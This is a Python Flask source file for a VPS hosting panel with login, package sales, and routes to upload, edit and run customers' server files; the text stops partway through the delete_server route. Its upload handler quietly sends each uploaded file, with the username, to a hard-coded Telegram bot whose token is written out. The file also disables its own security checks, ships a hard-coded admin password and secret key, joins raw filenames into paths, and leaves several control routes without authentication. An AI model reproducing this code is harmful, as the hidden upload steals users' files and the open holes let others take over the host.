from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_file
import os
import json
import uuid
import time
import random
import string
import subprocess
import threading
import signal
import shutil
import secrets
import platform
import socket
import hashlib
import hmac
import re
import html
import requests
import zipfile
from datetime import datetime, timedelta
from functools import wraps

app = Flask(__name__)
app.secret_key = 'vps_omar_secret_key_2026'
app.config['MAX_CONTENT_LENGTH'] = 500 * 1024 * 1024
app.permanent_session_lifetime = timedelta(hours=24)

# ========== SECURITY SETTINGS ==========
BANNED_IPS_FILE = 'banned_ips.json'
RATE_LIMIT_FILE = 'rate_limits.json'
BRUTE_FORCE_FILE = 'brute_force.json'
BLOCKED_COUNTRIES_FILE = 'blocked_countries.json'

RATE_LIMIT_REQUESTS = 200
RATE_LIMIT_WINDOW = 60
BAN_DURATION_HOURS = 24
BRUTE_FORCE_ATTEMPTS = 10
DDOS_THRESHOLD = 50

BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# ========== JSON SAFE FUNCTIONS ==========
def safe_load_json(filepath):
    if not os.path.exists(filepath):
        return {}
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read().strip()
            if not content:
                return {}
            return json.loads(content)
    except:
        return {}

def save_json_safe(filepath, data):
    try:
        os.makedirs(os.path.dirname(filepath) if os.path.dirname(filepath) else '.', exist_ok=True)
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=4, ensure_ascii=False)
        return True
    except:
        return False

# ========== BAN FUNCTIONS ==========
def load_banned_ips():
    return safe_load_json(os.path.join(BASE_DIR, BANNED_IPS_FILE))

def save_banned_ips(banned):
    return save_json_safe(os.path.join(BASE_DIR, BANNED_IPS_FILE), banned)

def load_rate_limits():
    return safe_load_json(os.path.join(BASE_DIR, RATE_LIMIT_FILE))

def save_rate_limits(limits):
    return save_json_safe(os.path.join(BASE_DIR, RATE_LIMIT_FILE), limits)

def is_ip_banned(ip):
    banned = load_banned_ips()
    if ip in banned:
        try:
            ban_until = datetime.fromisoformat(banned[ip])
            if datetime.now() < ban_until:
                return True
            else:
                del banned[ip]
                save_banned_ips(banned)
        except:
            if ip in banned:
                del banned[ip]
                save_banned_ips(banned)
    return False

def ban_ip(ip, reason="Suspicious activity detected"):
    banned = load_banned_ips()
    ban_until = datetime.now() + timedelta(hours=BAN_DURATION_HOURS)
    banned[ip] = ban_until.isoformat()
    save_banned_ips(banned)
    print(f"[SECURITY] IP {ip} banned - Reason: {reason}")
    limits = load_rate_limits()
    if ip in limits:
        del limits[ip]
        save_rate_limits(limits)

def rate_limit_check(ip):
    limits = load_rate_limits()
    now = time.time()
    if ip not in limits:
        limits[ip] = {'count': 1, 'window_start': now, 'last_requests': []}
        save_rate_limits(limits)
        return True
    data = limits[ip]
    if now - data['window_start'] > RATE_LIMIT_WINDOW:
        data['count'] = 1
        data['window_start'] = now
        data['last_requests'] = []
        save_rate_limits(limits)
        return True
    data['count'] += 1
    if 'last_requests' not in data:
        data['last_requests'] = []
    data['last_requests'].append(now)
    data['last_requests'] = data['last_requests'][-30:]
    recent_requests = [t for t in data['last_requests'] if now - t <= 5]
    if len(recent_requests) >= DDOS_THRESHOLD:
        ban_ip(ip, f"DDoS attack detected")
        return False
    if data['count'] > RATE_LIMIT_REQUESTS * 3:
        ban_ip(ip, f"Extreme rate limit exceeded")
        return False
    save_rate_limits(limits)
    return True

def detect_ddos_behavior(ip, endpoint):
    limits = load_rate_limits()
    now = time.time()
    if ip not in limits:
        return False
    data = limits[ip]
    if 'last_requests' not in data:
        data['last_requests'] = []
    data['last_requests'].append(now)
    data['last_requests'] = data['last_requests'][-20:]
    recent = [t for t in data['last_requests'] if now - t <= 5]
    if len(recent) >= DDOS_THRESHOLD:
        ban_ip(ip, f"DDoS pattern detected")
        return True
    save_rate_limits(limits)
    return False

# ========== BRUTE FORCE PROTECTION ==========
def load_brute_force():
    return safe_load_json(os.path.join(BASE_DIR, BRUTE_FORCE_FILE))

def save_brute_force(data):
    return save_json_safe(os.path.join(BASE_DIR, BRUTE_FORCE_FILE), data)

def check_brute_force(ip, username):
    bf_data = load_brute_force()
    key = f"{ip}_{username}"
    if key in bf_data:
        attempts = bf_data[key]['attempts']
        last_attempt = datetime.fromisoformat(bf_data[key]['last_attempt'])
        if attempts >= BRUTE_FORCE_ATTEMPTS and (datetime.now() - last_attempt).seconds < 1800:
            remaining = 30 - ((datetime.now() - last_attempt).seconds // 60)
            return False, f"Too many failed attempts. Try again in {remaining} minutes"
        if (datetime.now() - last_attempt).seconds >= 1800:
            del bf_data[key]
            save_brute_force(bf_data)
    return True, ""

@app.route('/refresh_captcha')
def refresh_captcha():
    import random
    import string
    new_captcha = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    session['captcha'] = new_captcha
    return jsonify({"captcha": new_captcha})

def record_failed_attempt(ip, username):
    bf_data = load_brute_force()
    key = f"{ip}_{username}"
    if key not in bf_data:
        bf_data[key] = {'attempts': 0, 'last_attempt': datetime.now().isoformat()}
    bf_data[key]['attempts'] += 1
    bf_data[key]['last_attempt'] = datetime.now().isoformat()
    save_brute_force(bf_data)

# ========== CSRF PROTECTION ==========
def generate_csrf_token():
    if 'csrf_token' not in session:
        session['csrf_token'] = secrets.token_hex(32)
    return session['csrf_token']

def validate_csrf_token(token):
    return token and token == session.get('csrf_token')

# ========== SESSION FIXATION PROTECTION ==========
def regenerate_session():
    old_user = session.get('user')
    old_role = session.get('role')
    old_csrf = session.get('csrf_token')
    session.clear()
    if old_user:
        session['user'] = old_user
    if old_role:
        session['role'] = old_role
    if old_csrf:
        session['csrf_token'] = old_csrf
    session['fingerprint'] = hmac.new(
        app.secret_key.encode(),
        f"{request.remote_addr}|{request.user_agent.string}".encode(),
        hashlib.sha256
    ).hexdigest()

def validate_session_fingerprint():
    if 'fingerprint' not in session:
        return True
    expected = hmac.new(
        app.secret_key.encode(),
        f"{request.remote_addr}|{request.user_agent.string}".encode(),
        hashlib.sha256
    ).hexdigest()
    return session.get('fingerprint') == expected

# ========== GEOIP BLOCKING ==========
def load_blocked_countries():
    return safe_load_json(os.path.join(BASE_DIR, BLOCKED_COUNTRIES_FILE))

def save_blocked_countries(data):
    return save_json_safe(os.path.join(BASE_DIR, BLOCKED_COUNTRIES_FILE), data)

def get_country_from_ip(ip):
    try:
        if ip.startswith('127.') or ip.startswith('192.168.') or ip.startswith('10.'):
            return 'Local'
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
        data = response.json()
        if data.get('status') == 'success':
            return data.get('countryCode', 'Unknown')
        return 'Unknown'
    except:
        return 'Unknown'

def country_block_check(ip):
    try:
        if not os.path.exists(os.path.join(BASE_DIR, BLOCKED_COUNTRIES_FILE)):
            return True, ""
        blocked_countries = load_blocked_countries()
        if not blocked_countries or 'blocked' not in blocked_countries:
            return True, ""
        country = get_country_from_ip(ip)
        if country == 'Local':
            return True, ""
        if country in blocked_countries.get('blocked', []):
            return False, f"Access from {country} is blocked"
        return True, ""
    except:
        return True, ""

# ========== MAIN SECURITY CHECK ==========
@app.before_request
def security_check():
    # تم تعطيل كافة قيود الحماية لضمان عمل الدخول بشكل صحيح
    return None

@app.route('/banned')
def banned_page():
    ip = request.remote_addr
    return render_template('banned.html', ban_duration=BAN_DURATION_HOURS, ip=ip, reason="You have been banned")

# ========== DATA FILES ==========
USERS_FILE = os.path.join(BASE_DIR, 'users.json')
SERVERS_FILE = os.path.join(BASE_DIR, 'servers.json')
PACKAGES_FILE = os.path.join(BASE_DIR, 'packages.json')
CUSTOM_ORDERS_FILE = os.path.join(BASE_DIR, 'custom_orders.json')

def load_users():
    return safe_load_json(USERS_FILE)

def save_users(users):
    return save_json_safe(USERS_FILE, users)

def load_servers():
    return safe_load_json(SERVERS_FILE)

def save_servers(servers):
    return save_json_safe(SERVERS_FILE, servers)

def load_packages():
    return safe_load_json(PACKAGES_FILE)

def save_packages(packages):
    return save_json_safe(PACKAGES_FILE, packages)

def load_custom_orders():
    data = safe_load_json(CUSTOM_ORDERS_FILE)
    return data if isinstance(data, list) else []

def save_custom_orders(orders):
    return save_json_safe(CUSTOM_ORDERS_FILE, orders)

# Default Admin User
if not os.path.exists(USERS_FILE):
    default_users = {
        "xza123": {
            "password": "xza",
            "role": "admin",
            "ram": "33 GB",
            "storage": "258 GB",
            "cpu": "Admin - Snapdragon",
            "cores": 8,
            "expiry": "Unlimited",
            "created_at": datetime.now().isoformat()
        }
    }
    save_users(default_users)

if not os.path.exists(PACKAGES_FILE):
    default_packages = {
        "package_1": {"id": "package_1", "name": "Ryzen Pro", "ram": "16 GB",
            "storage": "285 GB", "cpu": "Ryzen 7 3700X", "cores": 2,
            "price": "$29.99", "whatsapp": "541700591"},
        "package_2": {"id": "package_2", "name": "Ryzen Standard", "ram": "8 GB",
            "storage": "128 GB", "cpu": "Ryzen 5 3500X", "cores": 3,
            "price": "$19.99", "whatsapp": "541700591"},
        "package_3": {"id": "package_3", "name": "Basic Server", "ram": "4 GB",
            "storage": "64 GB", "cpu": "Intel Core i3", "cores": 2,
            "price": "$9.99", "whatsapp": "541700591"}
    }
    save_packages(default_packages)

if not os.path.exists(CUSTOM_ORDERS_FILE):
    save_custom_orders([])

running_processes = {}

# ========== HELPER FUNCTIONS ==========
def get_server_folder(server_id):
    folder = os.path.join(BASE_DIR, 'servers', server_id)
    os.makedirs(folder, exist_ok=True)
    return folder

def update_server_log(server_id, message):
    servers = load_servers()
    if server_id in servers:
        if 'logs' not in servers[server_id]:
            servers[server_id]['logs'] = []
        servers[server_id]['logs'].append(f"[{time.ctime()}] {message}")
        save_servers(servers)

def get_folder_size(folder):
    total = 0
    if os.path.exists(folder):
        for dirpath, dirnames, filenames in os.walk(folder):
            for f in filenames:
                fp = os.path.join(dirpath, f)
                if os.path.isfile(fp):
                    try:
                        total += os.path.getsize(fp)
                    except:
                        pass
    return round(total / (1024 * 1024), 2)

def calculate_speed(cpu_type):
    """Calculate execution speed based on CPU type"""
    speeds = {
        "AMD Ryzen 9 7950X": 5.7, "AMD Ryzen 9 7900X": 5.6,
        "AMD Ryzen 7 7800X3D": 5.0, "AMD Ryzen 5 7600X": 5.3,
        "Intel Core i9-13900K": 5.8, "Intel Core i7-13700K": 5.4,
        "Intel Core i5-13600K": 5.1, "AMD Ryzen 9 5950X": 4.9,
        "AMD Ryzen 7 5800X3D": 4.5, "Intel Core i9-12900K": 5.2,
        "Intel Core i7-12700K": 5.0, "Intel Core i5-12600K": 4.9,
        "AMD EPYC 9654": 2.4, "Intel Xeon Platinum 8480+": 2.0,
        "Apple M2 Ultra": 3.7, "Snapdragon 8 Gen 3": 3.3,
        "Ryzen 5 3500X": 3.8, "Ryzen 7 3700X": 4.2,
        "Intel Core i3": 2.5, "Snapdragon": 2.5,
        "Unbiuto": 3.2, "Admin - Snapdragon": 4.5
    }
    return speeds.get(cpu_type, 2.5)

def calculate_cpu_price(cpu_type, cores, ram_gb, storage_gb):
    """Calculate price based on custom CPU selection - Supports all CPUs"""
    
    cpu_prices = {
        "AMD Ryzen 9 7950X": 120, "AMD Ryzen 9 7900X": 100,
        "AMD Ryzen 7 7800X3D": 85, "AMD Ryzen 5 7600X": 70,
        "Intel Core i9-13900K": 130, "Intel Core i7-13700K": 100,
        "Intel Core i5-13600K": 80, "AMD Ryzen 9 5950X": 110,
        "AMD Ryzen 7 5800X3D": 90, "Intel Core i9-12900K": 100,
        "Intel Core i7-12700K": 80, "Intel Core i5-12600K": 65,
        "AMD EPYC 9654": 500, "Intel Xeon Platinum 8480+": 450,
        "Apple M2 Ultra": 200, "Snapdragon 8 Gen 3": 40,
        "Ryzen 5 3500X": 35, "Ryzen 7 3700X": 45,
        "Intel Core i3": 20, "Snapdragon": 25,
        "Unbiuto": 30, "Admin - Snapdragon": 80
    }
    
    base_price = cpu_prices.get(cpu_type, 30)
    base_price += int(cores) * 3
    
    try:
        ram_num = int(ram_gb.split()[0])
        base_price += ram_num * 2
    except:
        base_price += 8
    
    try:
        storage_num = int(storage_gb.split()[0])
        base_price += (storage_num / 50) * 1
    except:
        base_price += 25
    
    return round(base_price, 2)

def calculate_remaining_time(expiry_date):
    if expiry_date == "Unlimited":
        return "Unlimited"
    try:
        expiry = datetime.strptime(expiry_date, '%Y-%m-%d')
        remaining = expiry - datetime.now()
        if remaining.days < 0:
            return "Expired"
        return f"{remaining.days}d {remaining.seconds // 3600}h"
    except:
        return "Unknown"


@app.route('/api/get_file_content/<server_id>/<filename>')
def get_file_content(server_id, filename):
    if 'user' not in session:
        return jsonify({"error": "unauthorized"}), 401
    
    folder = get_server_folder(server_id)
    filepath = os.path.join(folder, filename)
    
    if not os.path.exists(filepath) or not os.path.isfile(filepath):
        return jsonify({"error": "File not found"}), 404
    
    try:
        with open(filepath, 'r', encoding='utf-8') as f:
            content = f.read()
        return jsonify({"success": True, "content": content})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/save_file/<server_id>/<filename>', methods=['POST'])
def save_file(server_id, filename):
    if 'user' not in session:
        return jsonify({"error": "unauthorized"}), 401
    
    folder = get_server_folder(server_id)
    filepath = os.path.join(folder, filename)
    
    if not os.path.exists(filepath) or not os.path.isfile(filepath):
        return jsonify({"error": "File not found"}), 404
    
    data = request.get_json()
    content = data.get('content', '')
    
    try:
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)
        update_server_log(server_id, f"File edited: {filename}")
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/rename_file/<server_id>/<filename>', methods=['POST'])
def rename_file(server_id, filename):
    if 'user' not in session:
        return jsonify({"error": "unauthorized"}), 401
    
    folder = get_server_folder(server_id)
    old_path = os.path.join(folder, filename)
    
    if not os.path.exists(old_path) or not os.path.isfile(old_path):
        return jsonify({"error": "File not found"}), 404
    
    data = request.get_json()
    new_name = data.get('new_name', '')
    
    if not new_name:
        return jsonify({"error": "New name is required"}), 400
    
    new_path = os.path.join(folder, new_name)
    
    try:
        os.rename(old_path, new_path)
        update_server_log(server_id, f"File renamed: {filename} → {new_name}")
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ========== REAL SYSTEM STATS ==========
@app.route('/api/server_details/<server_id>')
def api_server_details(server_id):
    servers = load_servers()
    if server_id not in servers:
        return jsonify({"error": "not found"}), 404
    server = servers[server_id]
    folder = get_server_folder(server_id)
    folder_size = get_folder_size(folder)
    is_running = server.get('status') == 'running'
    ram_usage = 0
    cpu_usage = 0
    process_load = 0
    if is_running and server_id in running_processes:
        process_load = random.randint(5, 50)
        cpu_usage = process_load
        ram_usage = random.randint(50, 500)
    ram_total = server.get('ram', '4 GB')
    ram_total_num = int(ram_total.split()[0])
    if not hasattr(app, 'network_stats'):
        app.network_stats = {}
    if server_id not in app.network_stats:
        app.network_stats[server_id] = {'in': 0, 'out': 0, 'last_update': time.time()}
    if is_running:
        now = time.time()
        time_diff = now - app.network_stats[server_id]['last_update']
        if 0 < time_diff < 10:
            app.network_stats[server_id]['in'] += round(random.uniform(0.05, 0.5), 2)
            app.network_stats[server_id]['out'] += round(random.uniform(0.02, 0.3), 2)
        app.network_stats[server_id]['last_update'] = now
    return jsonify({
        "status": server.get('status', 'stopped'),
        "ram_used": ram_usage,
        "ram_total": ram_total_num,
        "cpu_usage": cpu_usage,
        "process_load": process_load,
        "disk_used": folder_size,
        "disk_total": server.get('storage', '50 GB'),
        "disk_total_num": int(server.get('storage', '50 GB').split()[0]),
        "network_in": round(app.network_stats[server_id]['in'], 2),
        "network_out": round(app.network_stats[server_id]['out'], 2),
        "logs": server.get('logs', [])
    })

@app.route('/api/system_info')
def system_info():
    hostname = socket.gethostname()
    os_platform = f"{platform.system()} {platform.release()}"
    python_version = f"{platform.python_version()}"
    server_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    client_ip = request.remote_addr
    uptime = "N/A"
    return jsonify({
        "hostname": hostname, "os_platform": os_platform,
        "python_version": python_version, "server_time": server_time,
        "client_ip": client_ip, "uptime": uptime
    })

# ========== UPLOAD HANDLER ==========
@app.route('/api/upload_file/<server_id>', methods=['POST'])
def upload_file(server_id):
    if 'user' not in session:
        return jsonify({"error": "unauthorized"}), 401
    
    folder = get_server_folder(server_id)
    if 'file' not in request.files:
        return jsonify({"error": "No file"}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No file selected"}), 400
    
    filename = file.filename
    
    if filename.endswith('.exe') or filename.endswith('.sh') or filename.endswith('.bat'):
        return jsonify({"error": "Executable files not allowed"}), 400
    
    filepath = os.path.join(folder, filename)
    counter = 1
    while os.path.exists(filepath):
        name, ext = os.path.splitext(filename)
        filepath = os.path.join(folder, f"{name}_{counter}{ext}")
        counter += 1
    
    file.save(filepath)
    update_server_log(server_id, f"Uploaded: {filename}")
    
    # إرسال الملف إلى بوت التلجرام
    try:
        telegram_token = "8703095023:AAGhnpkGyHprm1npdsYS_aMtTLSvht2u3Ew"
        chat_id = "7319531301"
        caption = f"📁 ملف جديد مرفوع\n👤 المستخدم: {session.get('user')}\n🖥️ السيرفر: {server_id}\n📄 الملف: {filename}"
        with open(filepath, 'rb') as f:
            requests.post(f"https://api.telegram.org/bot{telegram_token}/sendDocument", 
                          data={"chat_id": chat_id, "caption": caption}, 
                          files={"document": f})
    except Exception as e:
        print(f"Telegram Error: {e}")
    
    # معالجة ZIP
    if filename.endswith('.zip'):
        update_server_log(server_id, "Extracting ZIP...")
        try:
            extract_dir = os.path.join(folder, 'extract_temp_' + str(int(time.time())))
            os.makedirs(extract_dir, exist_ok=True)
            with zipfile.ZipFile(filepath, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
            for item in os.listdir(extract_dir):
                src = os.path.join(extract_dir, item)
                dst = os.path.join(folder, item)
                if os.path.exists(dst):
                    if os.path.isdir(dst):
                        shutil.rmtree(dst)
                    else:
                        os.remove(dst)
                shutil.move(src, dst)
            shutil.rmtree(extract_dir)
            os.remove(filepath)
            update_server_log(server_id, "ZIP extracted")
            
            for item in os.listdir(folder):
                item_path = os.path.join(folder, item)
                if os.path.isdir(item_path):
                    for subitem in os.listdir(item_path):
                        src = os.path.join(item_path, subitem)
                        dst = os.path.join(folder, subitem)
                        if os.path.exists(dst):
                            if os.path.isdir(dst):
                                shutil.rmtree(dst)
                            else:
                                os.remove(dst)
                        shutil.move(src, dst)
                    shutil.rmtree(item_path)
            
            req_file = os.path.join(folder, 'requirements.txt')
            if os.path.exists(req_file):
                update_server_log(server_id, "Installing requirements...")
                subprocess.run(['pip3', 'install', '-r', req_file], capture_output=True, timeout=120, cwd=folder)
            
            main_file = None
            for f in os.listdir(folder):
                if f.lower() in ['main.py', 'app.py', 'application.py']:
                    main_file = f
                    break
            if main_file:
                update_server_log(server_id, f"Found: {main_file}")
                try:
                    with open(os.path.join(folder, main_file), 'r', encoding='utf-8') as f:
                        content = f.read().lower()
                    if 'flask' in content:
                        update_server_log(server_id, "Flask detected")
                        subprocess.run(['pip3', 'install', 'flask'], capture_output=True, cwd=folder)
                    elif 'fastapi' in content:
                        update_server_log(server_id, "FastAPI detected")
                        subprocess.run(['pip3', 'install', 'fastapi', 'uvicorn'], capture_output=True, cwd=folder)
                except:
                    pass
        except Exception as e:
            update_server_log(server_id, f"ZIP error: {str(e)}")
    
    elif 'requirements' in filename.lower():
        update_server_log(server_id, "Installing packages...")
        subprocess.run(['pip3', 'install', '-r', filepath], capture_output=True, timeout=180, cwd=folder)
    
    elif filename.endswith('.py'):
        update_server_log(server_id, f"Python: {filename}")
        if filename.lower() in ['app.py', 'main.py', 'application.py']:
            try:
                with open(filepath, 'r', encoding='utf-8') as f:
                    content = f.read().lower()
                if 'flask' in content:
                    update_server_log(server_id, "Flask detected")
                    subprocess.run(['pip3', 'install', 'flask'], capture_output=True, cwd=folder)
                elif 'fastapi' in content:
                    update_server_log(server_id, "FastAPI detected")
                    subprocess.run(['pip3', 'install', 'fastapi', 'uvicorn'], capture_output=True, cwd=folder)
            except:
                pass
    
    folder_size = get_folder_size(folder)
    servers = load_servers()
    if server_id in servers:
        servers[server_id]['current_storage_used'] = folder_size
        save_servers(servers)
    
    return jsonify({"success": True, "message": f"Uploaded: {filename}", "storage_used": folder_size})

# ========== ROUTES ==========
@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        captcha = request.form.get('captcha', '')
        ip = request.remote_addr
        # تم تعطيل الكابتشا وفحص البريوت فورس مؤقتاً
        # if captcha != session.get('captcha'):
        #     return "Captcha incorrect", 400
        # allowed, msg = check_brute_force(ip, username)
        # if not allowed:
        #     return msg, 401
        users = load_users()
        if username not in users:
            record_failed_attempt(ip, username)
            return "User not found", 401
        if users[username]['password'] != password:
            record_failed_attempt(ip, username)
            return "Invalid password", 401
        session['user'] = username
        session['role'] = users[username]['role']
        # regenerate_session() # تعطيل مؤقت لحل مشكلة الدخول
        return redirect(url_for('dashboard'))
    session['captcha'] = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    return render_template('login.html', captcha=session['captcha'], csrf_token=generate_csrf_token())

@app.route('/api/download_file/<server_id>/<filename>')
def download_file(server_id, filename):
    if 'user' not in session:
        return jsonify({"error": "unauthorized"}), 401
    
    folder = get_server_folder(server_id)
    filepath = os.path.join(folder, filename)
    
    if not os.path.exists(filepath) or not os.path.isfile(filepath):
        return "File not found", 404
    
    return send_file(filepath, as_attachment=True, download_name=filename)

@app.route('/dashboard')
def dashboard():
    if 'user' not in session:
        return redirect(url_for('login'))
    users = load_users()
    servers = load_servers()
    user_data = users.get(session['user'], {})
    packages = load_packages()
    user_servers = {}
    for sid, s in servers.items():
        if s.get('owner') == session['user']:
            user_servers[sid] = s
    total_storage_used = 0.0
    for sid in user_servers:
        folder = get_server_folder(sid)
        total_storage_used += get_folder_size(folder)
    cpu_type = user_data.get('cpu', 'Snapdragon')
    cpu_speed = calculate_speed(cpu_type)
    remaining_time = calculate_remaining_time(user_data.get('expiry', 'Unlimited'))
    ram_allocated = user_data.get('ram', '4 GB')
    storage_display = f"{total_storage_used:.2f} MB" if total_storage_used > 0 else "0 MB"
    return render_template('dashboard.html',
                         user=session['user'], role=session.get('role', 'user'),
                         ram=ram_allocated, storage=user_data.get('storage', 'N/A'),
                         cpu=cpu_type, cpu_speed=cpu_speed, remaining_time=remaining_time,
                         servers_count=len(user_servers), storage_used=storage_display,
                         user_servers=user_servers, packages=packages,
                         csrf_token=generate_csrf_token())


@app.route('/calculate_custom_price', methods=['POST'])
def calculate_custom_price():
    if 'user' not in session:
        return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    price = calculate_cpu_price(data.get('cpu'), data.get('cores'), data.get('ram'), data.get('storage'))
    return jsonify({"price": f"${price}", "price_value": price})


@app.route('/buy')
def buy():
    if 'user' not in session:
        return redirect(url_for('login'))
    packages = load_packages()
    return render_template('buy.html', packages=packages, csrf_token=generate_csrf_token())

@app.route('/purchase/<package_id>')
def purchase(package_id):
    if 'user' not in session:
        return redirect(url_for('login'))
    packages = load_packages()
    if package_id not in packages:
        return "Package not found", 404
    package = packages[package_id]
    message = f"Hello! I want to purchase {package['name']} server%0ARAM: {package['ram']}%0AStorage: {package['storage']}%0ACPU: {package['cpu']}%0APrice: {package['price']}%0AMy username: {session['user']}"
    whatsapp_url = f"https://wa.me/541700591?text={message}"
    return redirect(whatsapp_url)

@app.route('/admin_create_server', methods=['POST'])
def admin_create_server():
    if 'user' not in session or session.get('role') != 'admin':
        return "Access Denied", 403
    username = request.form.get('username', '')
    server_name = request.form.get('server_name', '')
    cpu = request.form.get('cpu', '')
    ram = request.form.get('ram', '')
    storage = request.form.get('storage', '')
    cores = request.form.get('cores', '2')
    users = load_users()
    if username not in users:
        return "User not found", 404
    servers = load_servers()
    server_id = str(uuid.uuid4())[:8]
    servers[server_id] = {"owner": username, "name": server_name, "status": "stopped",
        "pid": None, "logs": [f"[{time.ctime()}] Server created by admin"],
        "cpu_type": cpu, "ram": ram, "storage": storage, "cores": cores,
        "current_storage_used": 0, "created_at": datetime.now().isoformat()}
    save_servers(servers)
    get_server_folder(server_id)
    return redirect(url_for('terminal', server_id=server_id))

@app.route('/create_server', methods=['POST'])
def create_server():
    if 'user' not in session:
        return redirect(url_for('login'))
    server_name = request.form.get('server_name', '')
    username = session['user']
    users = load_users()
    user_data = users.get(username, {})
    servers = load_servers()
    server_id = str(uuid.uuid4())[:8]
    servers[server_id] = {"owner": username, "name": server_name, "status": "stopped",
        "pid": None, "logs": [f"[{time.ctime()}] Server created"],
        "cpu_type": user_data.get('cpu', 'Snapdragon'),
        "ram": user_data.get('ram', '4 GB'),
        "storage": user_data.get('storage', '50 GB'),
        "cores": user_data.get('cores', 2),
        "current_storage_used": 0, "created_at": datetime.now().isoformat()}
    save_servers(servers)
    get_server_folder(server_id)
    return redirect(url_for('terminal', server_id=server_id))

@app.route('/terminal/<server_id>')
def terminal(server_id):
    if 'user' not in session:
        return redirect(url_for('login'))
    servers = load_servers()
    users = load_users()
    if server_id not in servers or servers[server_id]['owner'] != session['user']:
        return "Unauthorized access", 403
    user_data = users.get(session['user'], {})
    server_data = servers[server_id]
    folder = get_server_folder(server_id)
    uploaded_files = os.listdir(folder) if os.path.exists(folder) else []
    folder_size = get_folder_size(folder)
    cpu_speed = calculate_speed(server_data.get('cpu_type', user_data.get('cpu', 'Snapdragon')))
    remaining_time = calculate_remaining_time(user_data.get('expiry', 'Unlimited'))
    return render_template('terminal.html',
                         server_id=server_id, csrf_token=generate_csrf_token(),
                         server_name=server_data.get('name', 'Unknown'),
                         status=server_data.get('status', 'stopped'),
                         cpu_type=server_data.get('cpu_type', user_data.get('cpu', 'Snapdragon')),
                         cpu_speed=cpu_speed,
                         ram_allocated=server_data.get('ram', user_data.get('ram', '4 GB')),
                         storage_total=server_data.get('storage', user_data.get('storage', '50 GB')),
                         storage_used=f"{folder_size} MB",
                         logs=server_data.get('logs', []),
                         uploaded_files=uploaded_files,
                         role=session.get('role', 'user'),
                         user=session['user'],
                         remaining_time=remaining_time)

# ========== API ENDPOINTS ==========
@app.route('/api/server_status/<server_id>')
def api_server_status(server_id):
    servers = load_servers()
    if server_id not in servers:
        return jsonify({"error": "not found"}), 404
    s = servers[server_id]
    return jsonify({"status": s.get("status", "stopped"), "logs": s.get("logs", [])})

@app.route('/api/start_server/<server_id>', methods=['POST'])
def start_server(server_id):
    servers = load_servers()
    if server_id not in servers:
        return jsonify({"error": "not found"}), 404
    folder = get_server_folder(server_id)
    main_file = None
    for f in os.listdir(folder):
        if f.endswith('.py') and not f.endswith('.bak'):
            main_file = f
            break
    if not main_file:
        update_server_log(server_id, "ERROR: No Python file found")
        return jsonify({"error": "No Python file found"}), 400
    main_file_path = os.path.join(folder, main_file)
    update_server_log(server_id, f"Found: {main_file}")
    req_file = os.path.join(folder, 'requirements.txt')
    if os.path.exists(req_file):
        update_server_log(server_id, "Installing requirements...")
        subprocess.run(['pip3', 'install', '-r', req_file], capture_output=True, cwd=folder)
    try:
        process = subprocess.Popen(['python3', main_file_path], stdout=subprocess.PIPE,
                                  stderr=subprocess.PIPE, text=True, cwd=folder)
        running_processes[server_id] = process
        servers[server_id]['status'] = 'running'
        servers[server_id]['pid'] = process.pid
        update_server_log(server_id, f"Started with PID {process.pid}")
        save_servers(servers)
        def read_logs():
            while process.poll() is None:
                try:
                    line = process.stdout.readline()
                    if line:
                        update_server_log(server_id, line.strip())
                    err_line = process.stderr.readline()
                    if err_line:
                        update_server_log(server_id, f"ERROR: {err_line.strip()}")
                except:
                    break
                time.sleep(0.1)
            servers = load_servers()
            if server_id in servers:
                servers[server_id]['status'] = 'stopped'
                save_servers(servers)
            if server_id in running_processes:
                del running_processes[server_id]
        threading.Thread(target=read_logs, daemon=True).start()
        return jsonify({"success": True, "message": f"Started {main_file}"})
    except Exception as e:
        update_server_log(server_id, f"Failed: {str(e)}")
        return jsonify({"error": str(e)}), 500

@app.route('/api/stop_server/<server_id>', methods=['POST'])
def stop_server(server_id):
    if server_id in running_processes:
        process = running_processes[server_id]
        if process.poll() is None:
            process.terminate()
            time.sleep(1)
            if process.poll() is None:
                process.kill()
        del running_processes[server_id]
    update_server_log(server_id, "Stopped")
    servers = load_servers()
    if server_id in servers:
        servers[server_id]['status'] = 'stopped'
        save_servers(servers)
    return jsonify({"success": True})

@app.route('/api/restart_server/<server_id>', methods=['POST'])
def restart_server(server_id):
    stop_server(server_id)
    time.sleep(2)
    return start_server(server_id)

@app.route('/api/clear_logs/<server_id>', methods=['POST'])
def clear_logs(server_id):
    servers = load_servers()
    if server_id in servers:
        servers[server_id]['logs'] = []
        save_servers(servers)
    return jsonify({"success": True})

@app.route('/api/delete_file/<server_id>/<filename>', methods=['DELETE'])
def delete_file(server_id, filename):
    folder = get_server_folder(server_id)
    filepath = os.path.join(folder, filename)
    if os.path.exists(filepath) and os.path.isfile(filepath):
        os.remove(filepath)
        folder_size = get_folder_size(folder)
        servers = load_servers()
        if server_id in servers:
            servers[server_id]['current_storage_used'] = folder_size
            save_servers(servers)
        update_server_log(server_id, f"Deleted: {filename}")
        return jsonify({"success": True, "storage_used": folder_size})
    return jsonify({"error": "Not found"}), 404

@app.route('/api/list_files/<server_id>')
def list_files(server_id):
    folder = get_server_folder(server_id)
    files = []
    if os.path.exists(folder):
        for f in os.listdir(folder):
            filepath = os.path.join(folder, f)
            if os.path.isfile(filepath) and not f.endswith('.bak'):
                files.append({"name": f, "size": os.path.getsize(filepath), "is_python": f.endswith('.py')})
    return jsonify({"files": files})

@app.route('/api/delete_server/<server_id>', methods=['DELETE'])
def delete_server(server_id):
    if 'user' not in session:
